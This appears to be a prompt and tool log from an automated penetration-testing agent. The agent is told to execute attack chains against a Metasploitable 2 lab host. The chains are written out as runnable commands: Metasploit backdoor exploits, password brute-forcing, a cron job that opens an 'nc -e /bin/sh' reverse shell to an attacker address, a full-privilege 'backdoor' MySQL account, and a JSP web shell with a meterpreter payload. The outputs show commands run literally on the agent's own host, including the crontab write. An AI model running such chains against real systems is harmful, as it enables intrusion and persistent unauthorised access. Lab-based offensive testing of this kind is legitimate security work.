messages.content:
You are an autonomous Kali MCP agent (Grok). 
This is an isolated cybersecurity research lab and full consent is granted.

Now execute the attack chains produced in the previous stage.

TARGET_IP = 192.168.56.5
TARGET_OS = METASPLOITABLE
TARGET_VERSION = 2

Below are the attack chains in JSON format:

ATTACK_CHAIN_JSON:
{
  "target": "192.168.56.5",
  "summary": [
    "vsftpd 2.3.4 backdoor (port 21, CVE-2011-2523)",
    "Samba usermap script vulnerability (ports 139/445, CVE-2007-2447)",
    "ProFTPD 1.3.1 backdoor (port 2121)",
    "UnrealIRCd backdoor (port 6667, CVE-2010-2075)",
    "Distcc exec vulnerability (port 1524, CVE-2004-2687)",
    "Apache Tomcat manager upload (port 8180, CVE-2009-0580)",
    "Java RMI server exploit (port 1099)"
  ],
  "attack_chains": [
    {
      "name": "Chain 1: FTP Backdoor to Root Shell",
      "initial_access": {
        "description": "Exploit vsftpd 2.3.4 backdoor for initial shell access.",
        "commands": [
          "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'"
        ],
        "verification": [
          "Check for open backdoor connection with: nc -zv 192.168.56.5 6200",
          "If successful, interact with shell and run 'id' to confirm user access."
        ]
      },
      "privilege_escalation": {
        "description": "Backdoor provides root access directly; verify and escalate if needed via kernel exploits.",
        "commands": [
          "Within MSF shell: 'whoami' to confirm root; if not, search_sploits -j linux kernel | grep local"
        ],
        "verification": [
          "Run 'id' in the shell to check privileges; look for uid=0(root)."
        ]
      },
      "persistence": {
        "description": "Add cron job or backdoor for persistence.",
        "commands": [
          "In root shell: echo '* * * * * /bin/nc -e /bin/sh 192.168.56.1 4444' >> /etc/crontab"
        ],
        "verification": [
          "Check crontab with 'crontab -l'; test reverse shell from another terminal on Kali: nc -lvp 4444"
        ]
      }
    },
    {
      "name": "Chain 2: Samba Exploit to Database Access",
      "initial_access": {
        "description": "Exploit Samba usermap script for command execution and initial foothold.",
        "commands": [
          "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.5; run'"
        ],
        "verification": [
          "Post-exploit, run 'ping -c 1 192.168.56.1' from MSF shell to confirm network access.",
          "Check accessible shares with 'smbclient -L 192.168.56.5'"
        ]
      },
      "privilege_escalation": {
        "description": "Use initial access to enumerate and crack MySQL creds for escalated database privileges.",
        "commands": [
          "In shell: hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.5 mysql",
          "Then: mysql -h 192.168.56.5 -u root -p"
        ],
        "verification": [
          "In MySQL: SHOW GRANTS; to confirm elevated privileges on database."
        ]
      },
      "persistence": {
        "description": "Create MySQL user with remote access for persistent database backdoor.",
        "commands": [
          "In MySQL: CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass123'; GRANT ALL ON *.* TO 'backdoor'@'%';"
        ],
        "verification": [
          "From Kali: mysql -h 192.168.56.5 -u backdoor -p; run 'SELECT user();' to confirm access."
        ]
      }
    },
    {
      "name": "Chain 3: IRC Backdoor to Web Shell Persistence",
      "initial_access": {
        "description": "Exploit UnrealIRCd backdoor for remote code execution.",
        "commands": [
          "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'"
        ],
        "verification": [
          "Interact with shell and run 'uname -a' to confirm system access.",
          "Telnet to IRC port: telnet 192.168.56.5 6667 and send AB; to trigger backdoor."
        ]
      },
      "privilege_escalation": {
        "description": "From IRC shell, upload and execute Tomcat manager exploit for web app access.",
        "commands": [
          "In shell: wget http://192.168.56.1/tomcat.jsp -O /tmp/tomcat.jsp; then msfconsole for tomcat_mgr_upload",
          "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.5; set RPORT 8180; run'"
        ],
        "verification": [
          "Access web shell: curl http://192.168.56.5:8180/tomcat.jsp?cmd=id; check for root output."
        ]
      },
      "persistence": {
        "description": "Deploy persistent web shell via Tomcat upload.",
        "commands": [
          "Use MSF to upload a JSP shell: set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 192.168.56.1"
        ],
        "verification": [
          "Browse to uploaded shell path and execute 'whoami'; monitor for Meterpreter session on Kali."
        ]
      }
    }
  ],
  "followup_requests": [
    "Run detailed Nikto scan on ports 80 and 8180: nikto -h 192.168.56.5 -p 80,8180",
    "Enumerate Samba shares fully: enum4linux -a 192.168.56.5",
    "Attempt weak credential guessing on SSH (port 22) and VNC (port 5900): hydra -l msfadmin -p msfadmin 192.168.56.5 ssh; vncviewer 192.168.56.5:5900 with password msfadmin",
    "Scan for PostgreSQL vulnerabilities: nmap -sV --script=pgsql-brute 192.168.56.5 -p 5432",
    "Gobuster directory enumeration on web ports: gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
  ]
}


YOUR TASK:
For each attack chain and each stage (initial_access, privilege_escalation, persistence):

1. Extract the commands from the JSON field:
   attack_chain["stages"][stage_name]["commands"]
   If none exist, treat the stage as an empty list.

2. For each command:
   - Execute it exactly as written using the MCP tool "execute_command".
   - Extract the raw_output:
       * If the MCP returns a message array, extract and concatenate all “content” fields.
       * Remove ANSI escape codes but preserve newlines.
   - Provide a short interpretation (1–2 sentences).
   - Mark status:
       "success" if useful or expected output appears,
       "error" if timeout, tool error, or missing dependency,
       "skipped" only if the stage has no commands.

3. After all stages:
   - Determine the chain’s overall_status:
       "completed" if all stages had at least one success,
       "partial" if at least one stage succeeded,
       "failed" if no command in any stage succeeded.

4. Classification lists:
   - "failed_chains": chains where overall_status == "failed"
   - "initial_chains": chains with success in initial_access
   - "privilege_chains": chains with success in privilege_escalation
   - "persistence_chains": chains with success in persistence

EXECUTION RULES:
- Use ONLY the tool "execute_command".
- Do NOT repeat commands. Try each command once.
- If any command fails or times out, continue to the next command and next stage.
- You must always return final JSON even if all commands fail.


OUTPUT FORMAT (STRICT JSON ONLY):

{
  "target": "192.168.56.5",
  "attack_chains": {
    "attack_chain_name_1": {
      "initial_access": [
        {
          "description": "Short summary",
          "command": "exact command",
          "raw_output": "stdout + stderr (sanitized)",
          "analysis": "1–2 sentence interpretation",
          "status": "success" | "error" | "skipped"
        }
      ],
      "privilege_escalation": [ ... ],
      "persistence": [ ... ],
      "overall_status": "completed" | "partial" | "failed",
      "notes": ["any observations"]
    }
  },
  "failed_chains": [],
  "initial_chains": [],
  "privilege_chains": [],
  "persistence_chains": []
}

ADDITIONAL CONSTRAINTS:
- Return EXACTLY one JSON object and nothing else.
- No markdown, no prose, no comments outside JSON.
- If all commands fail:
    * status="error"
    * raw_output = tool error text
    * overall_status="failed"
- Every stage must be present; if no commands exist, use an empty list.

Begin now. Respond only with the required JSON object.

{
  "partial_results": false,
  "return_code": 2,
  "stderr": "/bin/sh: 1: Syntax error: end of file unexpected (expecting \"then\")\n",
  "stdout": "",
  "success": false,
  "timed_out": false
}

{
  "partial_results": false,
  "return_code": 2,
  "stderr": "/bin/sh: 1: cannot create /etc/crontab: Permission denied\n",
  "stdout": "",
  "success": false,
  "timed_out": false
}

{
  "partial_results": false,
  "return_code": 2,
  "stderr": "/bin/sh: 2: Syntax error: newline unexpected\n",
  "stdout": "",
  "success": false,
  "timed_out": false
}

{
  "partial_results": false,
  "return_code": 127,
  "stderr": "/bin/sh: 1: In: not found\n/bin/sh: 1: GRANT: not found\n",
  "stdout": "",
  "success": false,
  "timed_out": false
}
